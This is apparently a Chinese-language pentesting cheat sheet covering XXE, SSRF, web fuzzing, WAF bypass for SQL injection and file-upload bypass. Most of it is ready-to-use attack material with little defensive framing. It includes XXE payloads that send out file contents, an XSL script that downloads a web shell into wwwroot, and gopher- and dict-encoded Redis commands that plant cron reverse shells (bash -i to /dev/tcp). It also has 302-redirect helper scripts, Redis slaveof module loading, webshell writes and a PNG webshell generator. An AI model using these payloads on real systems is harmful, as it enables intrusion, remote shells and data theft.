<h6 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h6><pre><code>远程payload
&lt;!ENTITY % a SYSTEM &quot;file:///&quot;&gt; &lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &#39;gopher://ip:80/%a;&#39;&gt;&quot;&gt; %b; %c;
注入payload
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://attacker:80/1.xml&quot;&gt;%remote;]&gt;&lt;root/&gt;
</code></pre>
<h6 id="不同平台支持的协议"><a href="#不同平台支持的协议" class="headerlink" title="不同平台支持的协议"></a>不同平台支持的协议</h6><p><img src="11.png" alt="image"></p>
<h6 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h6><pre><code>安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;
</code></pre>
<h6 id="内网主机探测"><a href="#内网主机探测" class="headerlink" title="内网主机探测"></a>内网主机探测</h6><pre><code>可先读取/etc/network/interfaces、/proc/net/arp、/etc/hosts等文件查询IP段
使用脚本
</code></pre>
<h6 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h6><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  
&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [  
&lt;!ELEMENT data (#PCDATA)&gt;  
]&gt;
&lt;data&gt;4&lt;/data&gt;
可使用burpsuite的intruder模块进行遍历
</code></pre>
<h6 id="内部DTD利用"><a href="#内部DTD利用" class="headerlink" title="内部DTD利用"></a>内部DTD利用</h6><h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h6><pre><code>    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
    &lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;
%local_dtd;
</code></pre>
<h6 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h6><pre><code>&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;
&lt;!ENTITY % SuperClass &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;
%local_dtd;
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE message [
&lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;

&lt;!ENTITY % condition &#39;aaa)&gt;
    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
    &amp;#x25;eval;
    &amp;#x25;error;
    &lt;!ELEMENT aa (bb&#39;&gt;

%local_dtd;
]&gt;
&lt;message&gt;any text&lt;/message&gt;
</code></pre>
<h6 id="XXE写shell"><a href="#XXE写shell" class="headerlink" title="XXE写shell"></a>XXE写shell</h6><pre><code>当XXE支持XSL时
&lt;?xml version=&#39;1.0&#39;?&gt;
&lt;xsl:stylesheet version=&quot;1.0&quot;
xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;
xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;
&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;user&quot;&gt;
&lt;![CDATA[
public string xml()
&#123;
    System.Net.WebClient webClient = new System.Net.WebClient();
    webClient.DownloadFile(&quot;https://x.x.x.x/shell.txt&quot;,
                   @&quot;c:\inetpub\wwwroot\shell.aspx&quot;);

return &quot;Exploit Success&quot;;
&#125;
]]&gt;
&lt;/msxsl:script&gt;
&lt;xsl:template match=&quot;/&quot;&gt;
&lt;xsl:value-of select=&quot;user:xml()&quot;/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><pre><code>服务端请求伪造
构造一个由服务器发出请求的漏洞
服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制
</code></pre>
<h5 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h5><pre><code>file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞
</code></pre>
<h5 id="挖掘-1"><a href="#挖掘-1" class="headerlink" title="挖掘"></a>挖掘</h5><pre><code>转码服务
在线翻译
获取超链接的标题等内容进行显示
请求远程服务器资源的地方，图片加载与下载(通过URL地址加载或下载图片)
图片、文章收藏功能
对外发起网络请求的地方，网站采集、网页抓取的地方。
头像 (远程加载头像)
一切要你输入网址的地方和可以输入ip的地方。
数据库内置功能(mongodb的copyDatabase函数)
邮件系统
文件处理
在线处理工具
从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain
</code></pre>
<h6 id="XML-1"><a href="#XML-1" class="headerlink" title="XML"></a>XML</h6><pre><code>&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/evil.dtd&quot;&gt;
&lt;!ENTITY % file system &quot;file:///etc/passwd&quot; &gt;
&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/file?data=%file&quot;&gt;
&lt;!DOCTYPE roottag PUBLIC &quot;-//VSR//PENTEST//EN&quot; &quot;http://wuyun.org/urlin&quot;&gt;
&lt;xenc:AgreementMethod Algorithm= &quot;http://wuyun.org/1&quot;&gt;
&lt;xenc:EncryptionProperty Target= &quot;http://wuyun.org/2&quot;&gt;
&lt;xenc:CipherReference URI= &quot;http://wuyun.org/3&quot;&gt;
&lt;xenc:DataReference URI= &quot;http://wuyun.org/4&quot;&gt;
&lt;Reference URI=&quot;http://wuyun.org/5&quot;&gt;
&lt;To xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;http://wuyun.org/to&lt;/To&gt;
&lt;ReplyTo xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;
&lt;Address&gt;http://wuyun.org/rto&lt;/Address&gt;
&lt;input message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/ip&quot; /&gt;
&lt;output message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/op&quot; /&gt;
&lt;wsp:PolicyReference URI=“http://wuyun.org/pr&quot;&gt;
&lt;fed:Federation FederationID=&quot;http://wuyun.org/fid&quot;&gt;
&lt;fed:FederationInclude&gt;http://wuyun.org/inc&lt;/fed:FederationInclude&gt;
&lt;fed:TokenIssuerName&gt;http://wuyun.org/iss&lt;/fed:TokenIssuerName&gt;
&lt;mex:MetadataReference&gt;
&lt;wsa:Address&gt;http://wuyun.org/mex&lt;/wsa:Address&gt;
&lt;/mex:MetadataReference&gt;
&lt;edmx:Reference URI=&quot;http://wuyun.org/edmxr&quot;&gt;
&lt;edmx:AnnotationsReference URI=&quot;http://wuyun.org/edmxa&quot;&gt;
&lt;xbrli:identifier scheme=&quot;http://wuyun.org/xbr&quot;&gt;
&lt;link:roleType roleURI=&quot;http://wuyun.org/role&quot;&gt;
&lt;stratml:Source&gt;http://wuyun.org/stml&lt;/stratml:Source&gt;
</code></pre>
<h6 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h6><h6 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h6><pre><code>db.copyDatabase(&#39;\r\nconfig set dbfilename ssrf\r\nquit\r\n’,&#39;test&#39;,&#39;10.6.4.166:6379&#39;)
</code></pre>
<h6 id="PostgresSQL"><a href="#PostgresSQL" class="headerlink" title="PostgresSQL"></a>PostgresSQL</h6><pre><code>SELECT dblink_send_query(
 &#39;host=127.0.0.1 
dbname=quit 
user=\&#39;\r\nconfig set dbfilename wyssrf\r\n\quit\r\n&#39; 
password=1 port=6379 sslmode=disable&#39;, 
&#39;select version();’ 
);
</code></pre>
<h6 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>SELECT openrowset(&#39;SQLOLEDB&#39;, &#39;server=192.168.1.5;uid=sa;pwd=sa;database=master&#39;)
SELECT * FROM OpenDatasource(&#39;SQLOLEDB&#39;, &#39;Data Source=ServerName;User ID=sa;Password=sa&#39; ) .Northwind.dbo.Categories
</code></pre>
<h6 id="图片处理函数"><a href="#图片处理函数" class="headerlink" title="图片处理函数"></a>图片处理函数</h6><pre><code>FFmpeg
concat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd
ImageMagick
fill &#39;url(http://wyssrf.wuyun.org)&#39;
</code></pre>
<h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><pre><code>测试代码,需安装phpcurl模块apt-get install php7.0-curl
&lt;?php
echo &#39;r u ok?&#39;;
function curl($url)&#123;  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
&#125;
$url = $_GET[&#39;url&#39;];
curl($url);
?&gt;
对内网、本地进行端口扫描，获取服务的banner 信息
攻击运行在内网或本地的应用程序
对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)
攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)
读取内网资源(如：利用file协议读取本地文件等)
跳板
无视cdn
利用Redis未授权访问，HTTP CRLF注入实现getshell
</code></pre>
<h6 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h6><pre><code>&gt;curl -v &#39;http://192.168.0.110/ssrf.php?url=file:///etc/passwd&#39;
</code></pre>
<p><img src="12.png" alt="image"></p>
<pre><code>?url=php://filter/read=convert.base64-encode/resource=./1.php
</code></pre>
<h5 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h5><pre><code>&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=dict://127.0.0.1:22/&#39;
</code></pre>
<p><img src="13.png" alt="image"></p>
<pre><code>&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=dict://127.0.0.1:6379/info&#39;
</code></pre>
<p><img src="14.png" alt="image"></p>
<h6 id="SSRF-Redis"><a href="#SSRF-Redis" class="headerlink" title="SSRF+Redis"></a>SSRF+Redis</h6><pre><code>&gt;curl -v &#39;http://192.168.0.112/ssrf.php?url=gopher://192.168.0.120:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.108%2f12345%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;
</code></pre>
<p><img src="15.png" alt="image"><br><img src="16.png" alt="image"></p>
<h6 id="302反弹shell"><a href="#302反弹shell" class="headerlink" title="302反弹shell"></a>302反弹shell</h6><pre><code>?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=flushall
302.php
&lt;?php
$ip = $_GET[&#39;ip&#39;];
$port = $_GET[&#39;port&#39;];
$scheme = $_GET[&#39;s&#39;];
$data = $_GET[&#39;data&#39;];
header(&quot;Location: $scheme://$ip:$port/$data&quot;);
?&gt;
?url=http://xxxx/reverse.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;bhost=*.*.*.*&amp;bport=1234
reverse.php
&lt;?php
$ip = $_GET[&#39;ip&#39;];
$port = $_GET[&#39;port&#39;];
$bhost = $_GET[&#39;bhost&#39;];
$bport = $_GET[&#39;bport&#39;];
$scheme = $_GET[&#39;s&#39;];
header(&quot;Location: $scheme://$ip:$port/set:0:\&quot;\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;);
?&gt;
?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dir:/var/spool/cron/
?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dbfilename:root
?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=save
可设置burp–&gt;intruder指定变量跑。
</code></pre>
<h6 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h6><pre><code>https://github.com/FoolMitAh/mysql_gopher_attack
https://fireshellsecurity.team/isitdtu-friss/
</code></pre>
<h6 id="Weblogic-SSRF-Redis"><a href="#Weblogic-SSRF-Redis" class="headerlink" title="Weblogic SSRF+Redis"></a>Weblogic SSRF+Redis</h6><pre><code>探测
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80
Redis反弹
set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;
config set dir /etc/
config set dbfilename crontab
save
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.0.110:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
SSRF+内网Struct2
http://www.xx.com/ssrf.php?url=http://10.1.1.1/action?action?redirect:http://attackerip/
</code></pre>
<h6 id="Ueditor-SSRF"><a href="#Ueditor-SSRF" class="headerlink" title="Ueditor SSRF"></a>Ueditor SSRF</h6><pre><code>/editor/ueditor/php/controller.php?action=catchimage&amp;source[]=http://my.ip/?aaa=1%26logo.png
</code></pre>
<h6 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h6><pre><code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo
</code></pre>
<h6 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h6><pre><code>直接访问
http://www.xx.com/ssrf.php?url=http://192.168.0.1
</code></pre>
<p><img src="17.png" alt="image"></p>
<pre><code>伪造POST请求
&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=gopher://192.168.0.10:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%20192.168.220.139%250d%250aUser-Agent:%20curl/7.42.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=bbbbb&#39;
</code></pre>
<h6 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h6><pre><code>本地绕过
http://127.0.0.1=http://localhost
[::]绕过
http://[::]:80=http://127.0.0.1
@绕过
http://www.xx.com/1.php?url=http://www.xx.com@127.0.0.1:8080
利用短网址
http://tool.chinaz.com/tools/dwz.aspx
http://dwz.cn/
DNS解析
http://www.qq.com.127.0.0.1.xip.io，可解析为127.0.0.1
自己域名设置A记录，指向127.0.0.1
进制转换
127.0.0.1
八进制：0177.0.0.1
十六进制：0x7f.0.0.1
十进制：2130706433
http://www.bejson.com/convert/ip2int/
句号
127。0。0。1
302脚本
&lt;?php
$ip = $_GET[&#39;ip&#39;];
$port = $_GET[&#39;port&#39;];
$scheme = $_GET[&#39;s&#39;];
$data = $_GET[&#39;data&#39;];
header(&quot;Location: $scheme://$ip:$port/$data&quot;);
?&gt;
攻击方VPS监听8080
dict协议
dict://www.attack.com:8080/hello:dict等于
ssrf.php?url=http://attack.com/302.php?s=dict&amp;ip=www.attack.com&amp;port=8080&amp;data=hello:dict
Gopher协议
gopher:// www.attack.com:8080/gopher
ssrf.php?url=http://attack.com/302.php?s=gopher&amp;ip=www.attack.com&amp;port=8080&amp;data=gopher
File协议
攻击机新建file.php
&lt;?php
header(&quot;Location: file:///etc/passwd&quot;);
?&gt;
ssrf.php?url=http://attack.com/file.php
</code></pre>
<h6 id="gopher协议的脚本转换"><a href="#gopher协议的脚本转换" class="headerlink" title="gopher协议的脚本转换"></a>gopher协议的脚本转换</h6><pre><code>抓取本地测试的正常请求
&gt;socat -v tcp-listen:4444,fork tcp-connect:目标IP:6379
</code></pre>
<p><img src="18.png" alt="image"><br><img src="19.png" alt="image"></p>
<pre><code>将捕获日志保存txt
使用脚本转换为支持gopher协议的字符串
转换规则
如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。
如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。
将\r字符串替换成%0d%0a
空白行替换为%0a
</code></pre>
<p><img src="20.png" alt="image"></p>
<pre><code>本地可执行
</code></pre>
<p><img src="21.png" alt="image"></p>
<pre><code>远程执行需对空格进行编码后再url编码一次
*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/192.168.0.108/12138%200&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
</code></pre>
<p><img src="22.png" alt="image"><br><img src="23.png" alt="image"><br><img src="24.png" alt="image"></p>
<h6 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h6><pre><code>Curl版本需低于7.15.1
file:可回显时，使用file读取任意文件
dict:查看端口，操作内网服务
gopher:可发出get/post请求
使用gopher协议时，要进行两次url编码
http/https:探测存活主机
</code></pre>
<h6 id="dict协议写shell"><a href="#dict协议写shell" class="headerlink" title="dict协议写shell"></a>dict协议写shell</h6><pre><code>?url=dict://127.0.0.1:6379/set:x:&lt;?php phpinfo();?&gt;
?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
?url=dict://127.0.0.1:6379/config:set:dbfilename:php.php
?url=dict://127.0.0.1:6379/save
Unicode编码
?url=dict://127.0.0.1:6379/set:x:&quot;\x3C\x3Fphp\x20echo `$_GET[x]`\x3B\x3F\x3E&quot;
</code></pre>
<h6 id="slaveof复制shell到目标"><a href="#slaveof复制shell到目标" class="headerlink" title="slaveof复制shell到目标"></a>slaveof复制shell到目标</h6><pre><code>From:http://r3start.net/index.php/2020/05/09/683
你的redis设置一个shell的键
Yourredis&gt;FLUSHALL
Yourredis&gt;set shell &quot;&lt;?php phpinfo();?&gt;&quot;
?url=dict://127.0.0.1:6379/slaveof:yourredisIP:6379
?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
?url=dict://127.0.0.1:6379/config:set:dbfilename:test.php
?url=dict://127.0.0.1:6379/save
?url=dict://127.0.0.1:6379/slaveof:no:one
</code></pre>
<h6 id="slaveof反弹shell"><a href="#slaveof反弹shell" class="headerlink" title="slaveof反弹shell"></a>slaveof反弹shell</h6><pre><code>?url=dict://127.0.0.1:6379/slaveof: yourredisIP:6379
?url=dict://127.0.0.1:6379/config:set:dbfilename:exp.so
?url=dict://127.0.0.1:6379/MODULE:LOAD:./exp.so
?url=dict://127.0.0.1:6379/SLAVEOF:NO:ONE
?url=dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb
?url=dict://127.0.0.1:6379/system.exec:&#39;curl x.x.x.x/x&#39;
?url=dict://127.0.0.1:6379/system.rev:x.x.x.x:8887
</code></pre>
<h4 id="Fuzz-扫描web"><a href="#Fuzz-扫描web" class="headerlink" title="Fuzz/扫描web"></a>Fuzz/扫描web</h4><pre><code>#dirb http://192.168.0.1 /root/asp.txt,/root/dir.txt -a &quot;USER-AGENT&quot; –c &quot;Cookie&quot; -z 100
#nikto -C all -h http://192.168.0.107 nikto扫描web服务
#wpscan --url http://192.168.0.107/ -e u --wordlist /root/wordlist.txt 枚举用户爆破密码
#wpscan --url http://192.168.0.107/ -e vp 扫描漏洞插件
#perl joomscan.pl --url 192.168.0.107
</code></pre>
<h5 id="WFuzz"><a href="#WFuzz" class="headerlink" title="WFuzz"></a>WFuzz</h5><pre><code>爆破文件和文件夹
&gt;wfuzz -w wordlist URL/FUZZ.php
&gt;wfuzz -w wordlist URL/FUZZ
枚举数字参数
&gt;wfuzz -z range,000-999 -b session=session -b cookie=cookie http://127.0.0.1/getuser.php?uid=FUZZ
POST账号密码爆破FUZnZ
&gt;wfuzz -w userList -w pwdList -d &quot;username=FUZZ&amp;password=FUZ2Z&quot; http://127.0.0.1/login.php
随机HTTP头
&gt;wfuzz -z range,0000-9999 -H &quot;X-Forwarded-For: FUZZ&quot; http://127.0.0.1/get.php?userid=666
使用代理fuzz
&gt;wfuzz -w wordlist -p 127.0.0.1:1087:SOCKS5 URL/FUZZ
基础认证爆破
&gt;wfuzz -z list,&quot;username-password&quot; --basic FUZZ:FUZZ URL
【结果过滤】--hc或--ss不显示符合条件的结果。
【结果过滤】--sc或--sl或--sw或--sh显示符合条件的结果。
</code></pre>
<h5 id="Cewl"><a href="#Cewl" class="headerlink" title="Cewl"></a>Cewl</h5><pre><code>爬行网站存为字典
&gt;cewl http://www.qq.com/ -w dict.txt
指定字典长度
&gt;cewl http://www.qq.com/ -m 9 -w dict.txt
网站提取Email
&gt;cewl http://www.qq.com/ -n –e
</code></pre>
<h5 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h5><pre><code>&gt;python3 dirsearch.py --random-user-agents --recursive --thread 50 --extension php --plain-text-report report.txt –url http://127.0.0.1
</code></pre>
<h4 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h4><h5 id="SQL注入分块传输"><a href="#SQL注入分块传输" class="headerlink" title="SQL注入分块传输"></a>SQL注入分块传输</h5><pre><code>https://github.com/c0ny1/chunked-coding-converter
</code></pre>
<p><img src="25.png" alt="image"><br><img src="26.png" alt="image"></p>
<pre><code>跑注入点被拦截
</code></pre>
<p><img src="27.png" alt="image"></p>
<pre><code>使用分块传输，右键选择
</code></pre>
<p><img src="28.png" alt="image"><br><img src="30.png" alt="image"></p>
<pre><code>使用SQLMAP跑注入
</code></pre>
<p><img src="31.png" alt="image"><br><img src="32.png" alt="image"></p>
<pre><code>&gt;python sqlmap.py -r 1.txt --batch --proxy=http://127.0.0.1:8080 --dbs
</code></pre>
<p><img src="33.png" alt="image"></p>
<h5 id="自动提供可用的tamper"><a href="#自动提供可用的tamper" class="headerlink" title="自动提供可用的tamper"></a>自动提供可用的tamper</h5><pre><code>https://github.com/m4ll0k/Atlas
GET类型的注入
python atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v
POST类型的注入
python atlas.py --url http://site.com/index/id/ -m POST -D &#39;test=%%10%%&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v
请求头注入
python atlas.py --url http://site.com/index/id/ -H &#39;User-Agent: mozilla/5.0%%inject%%&#39; -H &#39;X-header: test&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v
组合tamper
python atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --concat &quot;equaltolike,htmlencode&quot; --random-agent -v
列出tamper
python atlas.py -g
例子
注入
python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3
</code></pre>
<p><img src="658.png" alt="image"></p>
<pre><code>可以看到被拦截了
查找能绕过的tamper
python atlas.py --url &#39;http://site.com/index.php?id=Price_ASC&#39; --payload=&quot;&#39;) AND 8716=4837 AND (&#39;yajr&#39;=&#39;yajr&quot; --random-agent -v
</code></pre>
<p><img src="659.png" alt="image"></p>
<pre><code>根据返回码200得到一个可绕过waf的tamper
versionedkeywords这个tamper
继续注入
python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3 --tamper=versionedkeywords
根据状态码来判断有时会有点鸡肋，但是也能用用，随机发挥吧。
</code></pre>
<h5 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h5><pre><code>#coding=utf-8
import random,string
from urllib import parse
# code by yzddMr6
varname_min = 5
varname_max = 15
data_min = 20
data_max = 25
num_min = 50
num_max = 100
def randstr(length):
    str_list = [random.choice(string.ascii_letters) for i in range(length)]
    random_str = &#39;&#39;.join(str_list)
    return random_str
def main():
    data=&#123;&#125;
    for i in range(num_min,num_max):
        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))
    print(&#39;&amp;&#39;+parse.urlencode(data)+&#39;&amp;&#39;)
main()
放到要注入的字段前后
</code></pre>
<h5 id="上传bypass"><a href="#上传bypass" class="headerlink" title="上传bypass"></a>上传bypass</h5><h6 id="图片文件头"><a href="#图片文件头" class="headerlink" title="图片文件头"></a>图片文件头</h6><pre><code>PNG 的文件头为十六进制的 89 50 4E 47 0D 0A 1A 0A
GIF 为 47 49 46 38 37 61
JPG 为 FF D8 FF E0
</code></pre>
<h6 id="添加图片头或合并图片包含"><a href="#添加图片头或合并图片包含" class="headerlink" title="添加图片头或合并图片包含"></a>添加图片头或合并图片包含</h6><h6 id="后缀大小写"><a href="#后缀大小写" class="headerlink" title="后缀大小写"></a>后缀大小写</h6><h6 id="文件名前缀加-0x09"><a href="#文件名前缀加-0x09" class="headerlink" title="文件名前缀加[0x09]"></a>文件名前缀加[0x09]</h6><h6 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传.htaccess"></a>上传.htaccess</h6><pre><code>SetHandler application/x-httpd-php
</code></pre>
<h6 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h6><pre><code>GIF
找好一个大一点的GIF，尾部使用c32插入shell，上传，下载回来，使用burp的comparer功能找出整个文件没有被渲染的位置，插入shell再上传
JPG
使用脚本直接生成
https://github.com/BlackFan/jpg_payload
PNG
使用脚本直接生成
先取消php.ini注释;extension=php_gd2.dll
&lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
       0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
       0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
       0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
       0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
       0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
       0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
       0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;
    $r = $p[$y];
    $g = $p[$y+1];
    $b = $p[$y+2];
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
&#125;
imagepng($img,&#39;./1.png&#39;);
?&gt;
</code></pre>
<h6 id="上传php3-php4-phtml等"><a href="#上传php3-php4-phtml等" class="headerlink" title="上传php3,php4,phtml等"></a>上传php3,php4,phtml等</h6><h6 id="文件名后加-DATA"><a href="#文件名后加-DATA" class="headerlink" title="文件名后加::$DATA"></a>文件名后加::$DATA</h6><pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA&quot;
ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA\0x00\1.asp0x00.jpg&quot;
</code></pre>
